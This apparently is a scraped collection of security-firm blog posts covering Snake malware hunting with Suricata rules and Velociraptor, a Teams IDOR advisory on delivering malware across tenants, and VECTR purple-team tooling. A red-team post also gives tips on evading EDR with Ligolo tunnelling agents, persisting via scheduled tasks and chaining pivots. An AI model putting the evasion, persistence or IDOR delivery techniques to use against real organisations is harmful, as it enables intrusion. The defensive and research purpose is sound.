cannot be brute forced or guessed based on old passwords, requiring minimum password strengths and unique credentials for every account.\nUse appropriate role separation, account permissions and separate user and privileged accounts.\nImplement phishing-resistant MFA or go passwordless if possible (Biometrics and FIDO2 keys).\nDeploy digitally signed Security.txt files to all public facing web domains which conform to the recommendations in RFC 9118.\nAs a final note, JUMPSEC recommend reporting any Indicators of Compromise (IoCs) to the relevant authorities (NCSC for UK based organisations), as well as the wider security community where appropriate.","network-based-detection#Network-based Detection":"Network-based detection enables high-confidence for large-scale (network-wide) detection of custom Snake communication protocols. However, there is low visibility of Snake implant operations and encrypted data in transit. Snake http, http2, and tcp signatures also potentially produce false positives and Snake operators can easily change network-based signatures.\nTo counteract this, JUMPSEC recommend implementing Suricata rules to your NIDS appliances the following rules will enable you to detect http, http2 and tcp communication as leveraged by the implant. Further details can also be found within the advisory.\nSnake http rule The following RegEx can be used to build rules matching the http and http2 traffic contained within the HTTP header field.\n^[0-9A-Za-z]{10}[0-9A-Za-z/\\+]{11}= Which can be used in a Suricata rule as follows:\nalert http any any -\u003e any any (msg: \"http rule (Cookie)\";\\ pcre:\"/[0-9A-Za-z]{10}[0-9A-Za-z\\/\\+]{11}=/C\";\\ flow: established, to_server;\\ sid: 7; rev: 1;) alert http any any -\u003e any any (msg: \"http rule (Other Header)\";\\ pcre:\"/[0-9A-Za-z]{10}[0-9A-Za-z\\/\\+]{11}=/H\";\\ flow: established, to_server;\\ sid: 8; rev: 1;) Snake http2 rule For http2, the implant’s header is encoded using base62 with non-extraneous characters. The following RegEx should be able to identify matches of such a header:\n^[0-9A-Za-z]{22}[0-9A-Za-z/;_=]{11} alert http any any -\u003e any any (msg: \"http2 rule (Cookie)\";\\ pcre:\"/[0-9A-Za-z]{22}[0-9A-Za-z\\/_=\\;]{11}/C\";\\ flow: established, to_server;\\ sid: 9; rev: 1;) alert http any any -\u003e any any (msg: \"http2 rule (Other Header)\";\\ pcre:\"/[0-9A-Za-z]{22}[0-9A-Za-z\\/_=\\;]{11}/H\";\\ flow: established, to_server;\\ sid: 10; rev: 1;) Snake tcp rule The following rule helps capture the signature set during the client-to-server communication for tcp, which usually starts with “ustart”, as well as subsequent data flows that match the malware’s behaviour.\nalert tcp any any -\u003e any any (msg: \"tcp rule\";\\ content: \"|00 00 00 08|\"; startswith; dsize: 12;\\ flow: established, to_server; flowbits: set, a8; flowbits: noalert;\\ sid: 1; rev: 1;) alert tcp any any -\u003e any any (msg: \"tcp rule\";\\ content: \"|00 00 00 04|\"; startswith; dsize:8;\\ flow: established, to_server; flowbits: isset, a8; flowbits: unset, a8;\\ flowbits: set, a4; flowbits: noalert;\\ sid: 2; rev: 1;) alert tcp any any -\u003e any any (msg: \"tcp rule\";\\ content: \"|00 00 00 08|\"; startswith; dsize: 4;\\ flow: established, to_client; flowbits: isset, a4; flowbits: unset, a4;\\ flowbits: set, b81; flowbits: noalert;\\ sid: 3; rev: 1;) alert tcp any any -\u003e any any (msg: \"tcp rule\";\\ dsize: 8; flow: established, to_client; flowbits: isset, b81;\\ flowbits: unset, b81; flowbits: set, b8; flowbits: noalert;\\ sid: 4; rev: 1;) alert tcp any any -\u003e any any (msg: \"tcp rule\";\\ content: \"|00 00 00 04|\"; startswith; dsize: 4;\\ flow: established, to_client; flowbits: isset, b8; flowbits: unset, b8;\\ flowbits: set, b41; flowbits: noalert;\\ sid: 5; rev: 1;) alert tcp any any -\u003e any any (msg: \"tcp rule\";\\ dsize: 4; flow: established, to_client; flowbits: isset, b41;\\ flowbits: unset, b41;\\ sid: 6; rev: 1;) ","other-detection-mechanisms-and-sigma-rules#Other Detection Mechanisms and Sigma Rules":"Researchers at the open-source project SigmaHQ have also started developed rules that will help hunt for the malware and detect when it performs malicious operations in the network which can be found here.\nAs of now, the rules currently developed include:\nSNAKE Malware Kernel Driver File Indicator\nMalware Installer Name Indicators\nMalware WerFault Persistence File Creation\nPotential SNAKE Malware Installation CLI Arguments Indicator\nSNAKE Malware Installation Binary Indicator\nPotential SNAKE Malware Persistence Service Execution\nSNAKE Malware Covert Store Registry Key\nPotential Encrypted Registry Blob Related To SNAKE Malware\nSNAKE Malware Service Persistence\nShould a different set of rules be needed for your specific EDR or SOC/SIEM it is possible to utilise the extremely helpful open-source resource Uncoder to convert rules.","snakes-capabilities#Snake’s capabilities":"Following the NCSC and CISA’s detailed joint advisory on the highly sophisticated ‘Snake’ cyber espionage tool, JUMPSEC threat intelligence analysts have provided a condensed blueprint for organisations to start proactively hunting for Snake within their network, contextualising key Indicators of Compromise (IoC), and providing additional methods to validate the effectiveness of Snake detections.\nSnake’s capabilitiesThe implant dubbed ‘Snake’ has been attributed to Centre 16 of Russia’s state sponsored FSB. The tool has been collecting intelligence in over 50 countries for up to 20 years, targeting research facilities, government networks, financial services, communications organisations, and other Critical National Infrastructure (CNI) organisations, meaning these organisations should be particularly vigilant and take precautionary steps to protect their networks.\nDescribed by CISA as Centre 16’s “most sophisticated cyber espionage tool for long-term intelligence collection”, Snake typically targets and infects external facing infrastructure, with its ultimate aim to compromise domain controllers and administrator accounts, enabling attackers to gain widespread access and control within targeted networks.\nSnake achieves these aims though a combination of several advanced technical features:\nA decentralised model - While the majority of malicious implants listen to and report back to a central node (i.e C2 or Command and Control Server) as part of a centralised infrastructure, Snake leverages a “decentralised” Peer-to-peer (P2P) network, supported by active implants residing on infected systems. As no centralised node acts as C2, commands and their output can be sent, received or retrieved all within the P2P network as nodes communicate with each other to route traffic and store information.\nIndistinguishable from legitimate traffic - FSB operators can ensure that all traffic to targeted machines follow the Snake custom HTTP protocol effectively blending with legitimate traffic when using a compromised HTTP server as part of the Snake P2P network.\nNumerous containerised tools and techniques – The implant conceals a plethora of tools, including network sniffers and keyloggers that can enable further compromise of target networks.\nOperating as a Kernel Driver (rootkit capabilities / kernel driver) – The aforementioned concealed techniques and tools can subsequently infect machines in Kernel Land while simultaneously leveraging active and passive operational mechanisms to achieve its aims.\nHigh degree of persistence – To achieve persistence Snake generally registers a service called “WerFaultSvc” that executes Snake’s WerFault.exe located in “%windows%\\WinSxS\\”, which decrypts Snake’s components and loads them into memory.\nThe fact that Snake is state sponsored also adds additional resourcing capability, motivation, persistence and potential impact, making this a particularly potent threat given Russian efforts to influence political processes, conduct espionage, and disrupt critical infrastructure."},"title":"Hunting for 'Snake'"},"/articles/2023/06/2023-06-09-ligolo-quality-of-life-on-red-team-engagements/":{"data":{"":"** ligolo bugsbunny 2023 06 09 12 50 **In recent months we, JUMPSEC’s red team, have been using a nifty little tool that we would like to share with you in this blog post. Ligolo-ng is a versatile tool that has been aiding our covert, and slightly-less-covert, engagements with regards to tunnelling, exfiltration, persistence, and widely improving the operators’ “quality of life” when carrying out assessments involving beaconing from within an internal network.\nThis highly-useful tool is developed by Nicolas Chatelain and can be found on Github at https://github.com/nicocha30/ligolo-ng. Ligolo can be described as a modern tunnelling tool, similar to the likes of chisel, sshuttle or SSH, with the advantage of being written in GO and behaving just like a VPN. That is to say, when setup correctly operators can enjoy connections to a target network of up to 100 Mbits/sec, utilising various protocols such as ICMP (ping), UDP scans, SYN stealth scan, OS detection and DNS Resolution, which are commonly not allowed through proxychains or “standard” tunnelling tooling.\nThe tool uses agents on the compromised machine which connect to a publicly-facing proxy server to route traffic through a tun interface that is created on the host. In simple terms, Ligolo offers red teamers an alternative C2 channel that supports far more than traditional SSH or SOCKS proxies, allowing you to run a wider variety of tooling, much faster, and with what feels like too-good-to-be-true quality of life.\nThe gif below shows how quick it is to setup the proxy server on a linux host machine after downloading the proxy executable from the releases’ page on Github.\nlatest ligolo demo setup5 More and more, when using this tool, we discover features applicable to new use-cases. For example, beside its ease of use, things like using ping and private domain name resolution during a red team engagement are invaluable and can definitely improve the turnaround time and efficiency of an assessment. Once the necessary steps have been taken, as detailed below, operators can enjoy their entire suite of red team tooling on their linux server, with full name resolution, and speeds that are incomparable with that of traditional tunnelling on red team engagements. We have jokingly referred to Ligolo as allowing you to move your C2 into the target network!\nFurthermore, it is possible to set up listeners on deployed agents to welcome connections coming from agents deployed somewhere else in the target environment. Crucially, the agents do not require any privileged permissions to be executed on the compromised hosts, because of its “gvisor” implementation, which works by virtualising sandboxed containers that translate traffic reaching the central proxy server deployed on our host.\nAs previously mentioned, GO makes it highly versatile and flexible, allowing operators to customise the proxy as well as the agents, and compile them to bypass defences or implement additional capabilities that are not there by default.\nFor example, we found ourselves able to bypass common endpoint detection and response (EDR) mechanisms employed in a Windows environment by simply either packing the agent executable (something like Nimcrypt will do), removing unimportant pieces of code, restructuring the source-code, or by compiling the agents beforehand and adding extra flags to the syntax, such as the following:\nGOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\"\nResearchers at JUMPSEC have also recently determined that, in at least several mature client environments, the creation of new network interfaces is not monitored. Therefore, should you find yourself wanting to deploy a Ligolo proxy server on a compromised machine (remember you don’t need admin permissions to deploy an agent but you do need it to deploy a proxy server!), and that it does not appear that monitoring is in place for tunnelling tools such as Ligolo by default, which makes it an attractive target when compared to existing C2 payloads. A note of caution however, EDRs may flag the “tunnelling” functionality when traffic is exchanged between the agent and the proxy.\nfry takemymoney Once a successful connection has been established packets will be automatically (read automagically) routed to the intended target network, making it a seamless experience, and one that compares with the ease of which you would carry out operations in your own local network.\nThe agents can be easily modified and trivially executed by a Scheduled Task or a Cron Job for backdoor purposes or to establish persistence. When trying to achieve domain dominance on an engagement we found we were having to spend far less time in fixing or maintaining our foothold when compared to the usual routines of dealing with beacons, port forwarding and SSH tunnelling. Furthermore, we found that generally there are less restrictions in regards to the traffic we are allowed to generate and forward through.\nAs previously mentioned, another interesting capability of this tool is the possibility to create listeners on the agent themselves to chain connections as shown in the code block below.\n[Agent : domain\\Administrator@VICTIM] \u003e\u003e listener_add --addr \u003cagent_ip\u003e:11601 --to \u003cproxyserver_ip\u003e:11601 INFO[0326] Listener created on remote agent! This behaviour is particularly useful when the proxy server’s IP address is out of reach for the last deployed agent, but connection can be established from the final pivoted box to the adjacent network running a previously deployed ligolo’s agent, allowing a pass-through connection back to our proxy server leveraged by the agent listener/forwarder.\nFinally, some caveats to keep in consideration…Ligolo does not automatically recognise the subnets where traffic needs to be redirected to, therefore you will need to add your routes as you discover or need them, using something like “sudo ip route add 192.168.0.0/24 dev ligolo” on the proxy server’s host, and target’s nameservers to /etc/resolv.conf to use DNS instead of IP addresses in an internal network. Furthermore, do not expect your agents to automatically establish a tunnel when reconnecting to the proxy…an auto-connect feature needs to be developed in-house or wait for the feature to be released by the author. Finally, remember that when using it for client networks, you will need a publicly facing box reachable by the agents to listen for connections and execute commands from.\nAll in all, Ligolo enabled us to speed up our engagements, made our shells more stable and reliable, allowed for a larger and more comprehensive gathering of our targets data, and helped us spend less time maintaining an important part of our persistent operational infrastructure. Most importantly, it avoids the use of tooling on-disk or even in memory, as only the raw traffic leaves the compromised machine.\nTo conclude this blogpost, I just want to say (write) that we love Ligolo and we are very grateful to Nicolas Chatelain for creating this amazing instrument that we are proud to have in our day-to-day operational tool suite.\nReferences\n● The Cyber Plumber’s Handbook - https://github.com/opsdisk/the_cyber_plumbers_handbook\n● Ligolo-ng - https://github.com/nicocha30/ligolo-ng\n● Gvisor - https://gvisor.dev/\nAlternatives to Ligolo-ng:\n● Proxychains - https://github.com/haad/proxychains\n● Proxychains-ng - https://github.com/rofl0r/proxychains-ng\n● Chisel - https://github.com/jpillora/chisel\n● SSHuttle - https://github.com/sshuttle/sshuttle"},"title":"Ligolo: Quality of Life on Red Team Engagements"},"/articles/2023/06/2023-06-19-hunting-the-snake-an-overview-of-threat-hunting-with-velociraptor/":{"data":{"":"In May 2023 the NCSC and CISA released a joint cyber security advisory addressing a piece of Russian malware called Snake. According to them, this malware has been gathering intelligence for the FSB in more than 50 countries for the last 20 years. Off the back of this advisory JUMPSEC decided to perform a number of threat hunts to provide assurance for some of our clients.\nWhilst conducting these hunts, we thought it would be beneficial to share the high-level methodology for this in the form of a blog post, to encourage other security professionals to proactively search for emerging threats in their infrastructure. This post will show that whilst a rich understanding of malware, TTPs, and threat hunting would certainly be beneficial, this is not a hard requirement to get started with your first hunt. Using free open-source tooling such as Velociraptor, anyone can get started.\nVelociraptor enables incident responders, blue teamers and threat hunters to gather data about hosts through a Velociraptor agent deployed on the machine, and run modules (called “artifacts”) to carry out various checks (called “hunts”). The ultimate goal is to determine whether any malicious activity can be observed on the machine, and search for “undetectable” malware that might be running under the hood.\nA more detailed overview of the TTPs and IoCs discovered by the NCSC and CISA’s detailed joint advisory can be found in our recent “Hunting for Snake\". We urge readers who are interested or concerned about Snake to go and read that.\nAlthough the hunt came back “clean” (no Snake related implants or IoC were identified in the estate) we thought that readers could still benefit from commands, directions and the thought process that came from our approach when looking for the malicious implant.\nBefore starting, our “hunting plan” was designed to consider the following phases when using Velociraptor for hunting:\nIdentify executables and known-malicious files (in an attempt to reduce the scope) [table id=3 /]\nIdentify anomalous Registry entries on Windows Systems: [table id=4 /]\nIdentify persistence mechanisms (based on mitre TTPs):\nScheduled Tasks\nAutoruns (autorunsc)\nIdentify and check unsigned executables against VirusTotal (possibly using a more targeted scope)\nExecute Hayabusa through the Velociraptor agent across the identified possibly-compromised hosts for a forensic analysis of Windows Event Logs.\nFor this specific client we performed a hunt using Velociraptor combined with the aforementioned list of IoCs. This is a relatively comprehensive set of hunts for an in-depth analysis needed to determine if the positive IoCs returned at an initial stage are to be considered an incident or not.\nWith our game plan laid out, we began the hunt. To start, we looked for executables and known-malicious files using the `Windows.Search.FileFinder` artifact available on Velociraptor, targeting all Windows machines and looking for files such as:\njpsetup.exe, jpinst.exe, comadmin.dat, werfault.exe\nAnd for the following regex string:\n\".*\\/registration/(\\{[0-9A-F]{8}\\-([0-9A-F]{4}\\-){3}[0-9A-F]{12}\\}\\.){2}crmlog\"(regex). ink Configuring a hunt on Velociraptor.\nIf you’ve deployed Velociraptor in your estate you can leverage its features to configure and start hunting for indicators of compromise through the sheer amount of “artifacts” provided to speed up the information gathering phase, as well as labelling and taking actions based on the data returned.\nVelociraptor’s artifacts can be explored on the following two web pages:\nArtifacts Reference: https://docs.velociraptor.app/artifact_references/\nArtifacts Exchange - for community developed artifacts: https://docs.velociraptor.app/exchange/ During the hunt setup, it is possible to select how resource-intensive the agent should be when searching for IoCs within the individual hosts.\ncpu Limiting the CPU usage for the agents to 20%.\nThis is useful when there are sensitive legacy hosts running in the network. However, do note that this only applies to the CPU usage and not the actual bandwidth utilised by Velociraptor’s agents.\nSubsequently, we used the following paths to look for wefault.exe, the persistence mechanism employed by Snake:\nC:\\Windows\\**\\werfault.exe\nC:\\windows\\system32\\**\\werfault.exe\nC:\\windows\\system32\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\\*.exe\nC:\\Users\\**\\werfault.exe\nhunt1 Configuring the hunt for werfault.exe\nWhile multiple instances for this file were returned, none of them were actually revealing a compromise as they are legitimately signed and presenting a standard icon size.\nwerfault Multiple instances of werfault.exe were returned, but they were not malicious.\nThis file should also be searched using the following YARA rule to identify versions using an icon size different from the standard (one of the IoCs associated with this threat). This rule should be run on all files in the typical path, but more specifically for the `%Windows%\\WinSxS` directory.\nyararule YARA rule to search for malicious wefault.exe files.\nThe YARA rule confirmed that no hosts running werfault.exe presented a non-standard icon size.\nAnother IoC to look for is `comadmin.dat` which contains Snake’s Queue File (one of snake’s components, listed in our accompanying blog). If nothing comes back from this search, further searches can be done utilising a yara rule to search for a `comadmin.dat` with high entropy.\nWe hunted for instances of comadmin.dat, using both the `Windows.Search.FileFinder` and the `Generic.Detection.Yara.Glob` artifacts. The YARA rule is required to identify instances of this file presenting high-entropy.\nyarasetup Configuring YARA rule to hunt for comadmin.dat\nThe above-mentioned rule can also be used to look for files presenting a similar filename to the following glob:\n*.*.crmlog\ncrmlog Hunting for *.*.crmlog using the YARA rule\nThe last search we performed was in relation to the registry values known to be present when Snake is running on a host. We looked for default instances of known encryption / decryption keys from Snake in the `SECURITY\\Policy\\Secrets\\n` registry.\nUsing the known-malicious values listed in the original advisory we used a custom module to execute this hunt.\nregquery Configuring the hunt to search for known malicious values in Windows Registry.\nAt this point, we were satisfied with the consistency of negative results and since nothing suspicious came back we stopped the hunt there. However, one last check could consist of searching the memory of the hosts using the Yara rule developed by researchers at SigmaHQ.\nVelociraptor provides an artifact that allows you to run YARA rules in memory, however do use this at your own discretion and based on your network stability, reliability and bandwidth as the document referencing this artifact actually warns users that the feature is experimental and can end up crashing your system!\nyara2 YARA rule that can be deployed to search in-memory execution\nIn this case I could happily conclude that no indicators of compromise were observed on any of the Windows hosts analysed in our client’s network.\nIn conclusion, JUMPSEC recommends readers to hunt for Snake in their estate as soon as possible to rid themselves of all concerns relating to this persistent threat actor. Tools like Velociraptor have made this straightforward and can enable hunting and incident response capabilities relatively painlessly. Steps like the ones presented in this blog post can help readers become first-time hunters - identifying, isolating or entirely eliminating threats from within their estate."},"title":"Hunting the Snake: An Overview of Threat Hunting with Velociraptor"},"/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/":{"data":{"":"","#":"TL;DR Max Corbridge (@CorbridgeMax) and Tom Ellson (@tde_sec) of JUMPSEC’s Red Team recently discovered a vulnerability in the latest version of Microsoft Teams which allows for the possible introduction of malware into any organisations using Microsoft Teams in its default configuration. This is done by bypassing client-side security controls which prevent external tenants from sending files (malware in this case) to staff in your organisation. JUMPSEC has detailed remediation options, as well as some detection opportunities. Introduction Introducing malware into target organisations is becoming increasingly difficult. Many of the traditional payload types (.exe, Office Macros, etc) are now heavily-scrutinised or have been proactively addressed to reduce their efficacy. Similarly, payload delivery avenues such as phishing are becoming increasingly monitored and secured to reduce the ease with which threat actors’ malware can reach end-user devices. Mail security controls, IP blocklists, domain reputation, email HTML, content inspection, third-party mail security products, URL filtering and many more must be bypassed for a phishing campaign to traverse all anti-phishing security controls and land in a target’s inbox. As such, threat actors and red teams alike are looking for newer and potentially overlooked avenues of payload delivery. One such novel avenue is Microsoft Teams External Tenants. Organisations that use Microsoft Teams (91% of the Fortune 100 according to this article) inherit Microsoft’s default configuration which allows users from outside of their organisation to reach out to their staff members. By allowing this, an entirely new avenue of social engineering (and now payload delivery as this blog will explain) is created.\nDetail Microsoft Teams allows any user with a Microsoft account to reach out to ‘external tenancies’. Here, external tenancies can be thought of as any business or organisation using Microsoft Teams. These organisations each have their own Microsoft tenancy, and users from one tenancy are able to send messages to users in another tenancy. When doing so, an ‘External’ banner appears alongside the name as seen below. [caption id=“attachment_19671” align=“aligncenter” width=“391”] External banner on incoming message External banner applied to incoming message requests[/caption]\nAs someone who spent a long time doing purely social engineering (phishing, vishing, smshing, etc.) this is not a show stopper by any means. In my experience, whilst this banner (and the subsequent pop-up) may deter a handful of targets, there is still a significant percentage of staff that would click on a message from an external tenant and accept the subsequent warning that the user is ‘external’. In fact, this was proven only last month, as the techniques used in this blog post were successfully used to gain an initial foothold in a client’s environment as part of a red team engagement. This is especially true if the malicious party is impersonating a known member of your organisation, and has purchased and registered a brand-impersonation domain as red teams often do.\nWhen messaging staff in another organisation you are blocked from sending files to them, unlike with members of your own tenancy. See below the difference:\n[caption id=“attachment_19672” align=“aligncenter” width=“1496”] Messaging a member of the same organisation Messaging a member of the same organisation[/caption]\n[caption id=“attachment_19673” align=“aligncenter” width=“1421”] Restrictions when messaging someone in a different organisation Restrictions when messaging someone in a different organisation[/caption]\nSo far, this is nothing new. However, having leveraged this social engineering avenue in the past I began wondering if this security control could be bypassed to allow for seamless delivery of payloads directly into a target’s inbox on our red team engagements. I began looking online, and articles like this suggested that certain security controls are actually implemented client-side in Microsoft Teams.\nI raised this with JUMPSEC’s Head of Offensive Security (Tom Ellson) and no more than 10 minutes later we had bypassed the security control and were able to send files into a target organisation. Exploitation of the vulnerability was straightforward using a traditional IDOR technique of switching the internal and external recipient ID on the POST request, usually here:\n/v1/users/ME/conversations/\u003cRECIPIENT_ID\u003e/messages [caption id=“attachment_19674” align=“aligncenter” width=“1429”] 3 Payload delivered directly into a target inbox[/caption]\nWhen sending the payload like this, it is actually hosted on a Sharepoint domain and the target downloads it from there. It appears, however, in the target inbox as a file, not a link. Having identified the issue, I wanted to validate that this vulnerability would work as intended as an avenue for payload delivery into a target organisation, and not fall short for some unknown reason when used in a mature client environment. As such, last month I used this vulnerability to deliver our red team C2 (malware) payload directly into a target inbox to gain our initial foothold on a covert red team engagement. This allowed for a much more simple, reliable, and user-friendly payload delivery avenue than traditional phishing journeys. Why is this a big deal? The true reason I see this to be a potentially lucrative avenue for threat actors to deliver payloads is the fact that this bypasses nearly all modern anti-phishing security controls mentioned in the introduction of this advisory. Firstly, it is very straightforward to buy a domain similar to your target organisations and register it with M365. It avoids the need to use mature domains, with web servers, landing pages, CAPTCHAs, domain categorisation, and URL filtering. This is a huge time saver, as this can cost several days or more on a red team engagement when setting up the various bits of infrastructure needed for a convincing phishing campaign. Secondly, it avoids the now-rightfully-dangerous act of clicking on a link in an email, something that staff have been trained to avoid for years now, greatly reducing the likelihood of a typical staff member detecting this as a phishing attack. The payload will now be served by a trusted Sharepoint domain, and will arrive in the form of a file in a target’s Teams inbox. As such, the payload inherits the trust reputation of Sharepoint, not a malicious phishing website.\nFinally, when this vulnerability is combined with social engineering via Teams it becomes very easy to start a back-and-forth conversation, jump on a call, share screens, and more. By comparison, it makes social engineering via email feel very stagnant, and stop-start. When using this on a real engagement the pretext of an IT technician was used to ask the target if they could jump on a call to update some critical software. Once on the call this vulnerability was leveraged to deliver a payload and, when combined with a full social engineering attack, was implicitly trusted by the target. Impact This vulnerability affects every organisation using Teams in the default configuration. As such it has huge potential reach, and could be leveraged by threat actors to bypass many traditional payload delivery security controls. Having now proven this hypothesis, and used this vulnerability to successfully deliver malware that compromised a target machine in a client’s environment, I feel this has been successfully demonstrated as an exploitable finding.\nRemediation and Detection This vulnerability was reported to Microsoft, who validated that the vulnerability is legitimate, but said that it ‘did not meet the bar for immediate servicing’. I think this is a shame, but was nonetheless expected. As such, JUMPSEC has added this section to help organisations who might be concerned about the above findings. Firstly, I urge you to review if there is a business requirement for external tenants to have permission to message your staff in the first place. Of course, many businesses do legitimately require communication with other organisations, service providers, and more. That is not the case, however, for all businesses that use Teams. If you are not currently using Teams for regular communication with external tenants, tighten up your security controls and remove the option altogether. This can be done in Microsoft Teams Admin Center \u003e External Access.\nIf you do require communication with external tenants, but there are only a handful of organisations that you regularly communicate with, then you can change the security settings to only allow communication with certain allow-listed domains. This would be a good middle ground for shutting down this attack path, without affecting your business operations. This can be done in Microsoft Teams Admin Center \u003e External Access. If either of the above will not work in your unique business case you have a few options. Firstly, endeavour to educate staff on the possibility of productivity apps such as Teams, Slack, Sharepoint, etc, for launching social engineering campaigns. It is not just email that is being abused any more, and yet it seems, in my personal opinion, that when using alternative avenues to email there is an inherent trust, due to the rich history connecting phishing and emails. Regarding detections, there is currently limited support from Microsoft. Whilst there are plenty of Teams logs (see here for a full list https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide) these do not currently cover the crucial ‘External Tenants Messaging your Staff’, or even better ‘Staff Member Accepts Message Request from External Tenant’. The latter would be preferable, as it would eliminate alerts from previously-known external tenants (your service providers, etc) and focus just on new message requests. I have reached out to Microsoft to attempt to turn on these logs so that they can be monitored in line with the increased usage of Teams for social engineering. If you agree that this should be made available, then please give the feature request a thumbs up (https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db)\nWhilst not a perfect solution, it would be possible to use web proxy logs to alert on, or more likely gain some baseline visibility into, staff members accepting external message requests. In EMEA, when a Teams user accepts a message request from an external tenant it sends a POST request to a unique URI which you can monitor:\n/api/mt/emea/beta/userSettings/acceptlist/manage\n[caption id=“attachment_19675” align=“aligncenter” width=“947”] request clean URI for accepting external message requests[/caption]\nThe difficulty, at present, is turning this into a useful piece of telemetry with usernames, and the message in question. Monitoring this will, however, give you an idea of how common this transaction is in your estate, and allow you to potentially implement some of the mitigation factors mentioned above with a more educated understanding. Conclusion As a Red Teamer regularly tasked with achieving an initial foothold in a target organisation, I have a unique appreciation and concern for the above-mentioned finding. With over 270 million active monthly users, Teams is incredibly common in target organisations. JUMPSEC’s Detection and Response Team (DART) have seen a trend towards novel phishing and payload delivery techniques leveraged in the wild, including but not limited to using Teams external tenancies for social engineering. With threat actors continually experimenting with new social engineering attacks, organisations are having to expand their security awareness to cover previously-overlooked frontiers."},"title":"Advisory: IDOR in Microsoft Teams Allows for External Tenants to Introduce Malware"},"/articles/2023/09/2023-09-29-vectr-for-purple-team-engagements/":{"data":{"":"","atomic-red-team#\u003cimg src=\"images/image5.png\" alt=\"\"\u003eAtomic Red Team":"Introduction As anyone who has conducted a lengthy purple team engagement will tell you, logging and centralising the huge amount of data from these engagements can quickly become overwhelming. In the past we have seen attempts to use generic productivity software, such as Sharepoint, to attempt to track the huge number of activities and logs generated by both the red and blue teams. However, as you can imagine, shoehorning large quantities of engagement data from two teams with different operating procedures into a single application not built for this purpose can be…tricky.\nAs purple team enthusiasts, we believe we have found a better solution to this problem, and sharing that with the wider security community is the purpose of this blog post. We also want to share some guidance when using this framework to help others avoid making the mistakes we have in the past.\nWhat is VECTR? First of all, what is VECTR? VECTR is an open-source purple team framework that can assist in all phases of purple team exercises, from planning and executing test cases to sharing the relevant information with clients and colleagues. At its core, VECTR is a tool that enables red and blue teams to work together towards a common goal. The framework helps with streamlining operations, enhancing collaboration, and provides advanced reporting capabilities which we have found to be very useful. It allows purple teams to achieve a more comprehensive and proactive approach to improving security by highlighting the gaps that will help build, or improve, defensive controls.\nHowever, keep in mind that VECTR is still just a tool in your arsenal and it will not automate the above-mentioned tasks for you (at least not yet!). It therefore still requires a certain amount of manual labour for planning and entering test cases, maintaining and setting up the hosting server and importing libraries or backing up your databases. However, as a framework it does a good job of organising what can often become an enormous and convoluted data set of a lengthy purple team into something manageable and built for purpose.\nSetup and Backup The framework was developed by SRA (SecurityRiskAdvisors), it’s open-source and is available here: https://github.com/SecurityRiskAdvisors/VECTR. The setup is relatively straightforward and can be achieved by following the installation documentation located at https://docs.vectr.io/Installation/.\nimage4 Starting up the VECTR instance. VECTR stores engagement data in a MongoDB database. When delivering purple team engagements this database can be exported and has, in our case, been included as a deliverable to be used by our clients to explore the details of the engagement in their own time.\nAs VECTR will soon become the home of all of your important engagement data, it is crucial to have regular backups! To eliminate human error we create a cron job which executes a script that backs up the VECTR’s mongo database. We have shared this below.\n#!/bin/bash # 1. the script logs into the vectr box via ssh # and executes mongodump on the mongo container - # to save a snapshot of VECTR's database in /tmp. # 2. the dump is then moved out of the docker container # and on the hosting box's /tmp folder, archived as .tgz. # 3. using scp, a copy of the database dump is move onto your # local machine in ~/PurpleTeam/VECTR_Backups # now=$(date \"+%b_%d_%Y_%H.%M\") echo backup day and month:\"$now\" # run mongodump in the container, put it in the /tmp/ directory in the container. # This is using the default password and default container name: ssh -i ~/.ssh/vectr_box_rsa root@10.10.0.10 \"docker exec -w /tmp purpleteam-vectr-mongo-1 /bin/bash -c 'mongodump --username mongouser --password mongopsw --authenticationDatabase admin\" # copy the file out of the container: ssh -i ~/.ssh/vectr_box_rsa root@10.10.0.10 \"docker cp purpleteam-vectr-mongo-1:/tmp/dump$now.tgz .\" # copy the file to local machine: scp -i ~/.ssh/vectr_box_rsa root@10.10.0.10:\"/root/dump$now.tgz\" ~/PurpleTeam/VECTR_BACKUPS/ The above script can be used and executed regularly using a cronjob. crontabvectr The picture shows the crontab that execute the backup script every 30 minutes. In the worst case scenario, the mongo database can be restored to another VECTR instance running on a different box:\n# Copy the database backup onto the new machine and then copy it to the VECTR’s # mongo container using the following command: docker cp /home/ubuntu/dump.tgz instance_name-vectr-mongo-1:/home/ # Extract the database inside the docker container: tar -xzvf dump.tgz # Enter the container using bash: docker exec -it instance_name-vectr-mongo-1 bash # It is now possible to restore the database using the following command on the # VECTR hosting container: mongorestore ./databasename -db --username mongodbuser --password mongodbpassword --authenticationDatabase admin Procedure to restore a mongodb database on VECTR. Key Features Here are some of the features that we believe make VECTR an attractive option for purple teamers:\nEasy deployment Atomic Red Team integration Automation of test cases execution via custom runtimes Maintenance and backup integrations Reporting features (charts and graphs) MITRE Navigator integration Detection rules libraries Customisation options One of the things we love about VECTR is how clearly it was built for purple team engagements. As you can see below, each test case is split into red team and blue team. This allows for the red team to carry out a test case and log the outcome, evidence and change the status of the test case ready for the blue team. Built into the same test case item you have a section for the blue team to update if it was detected, prevented or alerted, and provide their own evidence. There really is no other tool we have found that makes centralising engagement activity so straightforward.\nimage5 How the Red and Blue team collaboration experience looks like in VECTR. Atomic Red Team As many purple teamers know, Atomic Red Team (ART) is a collection of Tactics, Techniques and Procedures (TTPs) that can speed up the process of identifying gaps in detection and response controls. It does this by automating the execution of techniques that are commonly carried out by advanced threat groups, allowing you to cover far more ground than manual testing alone. VECTR provides a nifty out-of-the-box integration for this library that can then be used to build specific “campaigns” (as labelled by VECTR). VECTR will generate an executable file in which all of your selected TTPs can be conducted one after another, hugely speeding up the process of mimicking the TTPs of a wide range of threat actors. We found that this freed up more time for the manual activities, whilst still allowing us to get wide coverage.\nimage2 Importing the ART library on VECTR to be used in our campaigns. The techniques can be individually “deployed” and executed on a target system (Windows, MacOS or Linux) or performed sequentially by leveraging the “Automation Runtime” executable generated from the VECTR dashboard.\nimage3 Selecting techniques to include in the Automation Runtime executable. image7 Individual techniques compiled through VECTR’s Automation Runtime feature. ","conclusion#Conclusion":"In summary, we found VECTR to be an exceptional tool for purple team engagements and collaborative projects that require both red and blue teams working together. The framework provides a great number of features out of the box, as well as opportunities for customisation. For this reason, we continue to use it during our purple team engagements and would like to extend a thank you to the team over at SRA 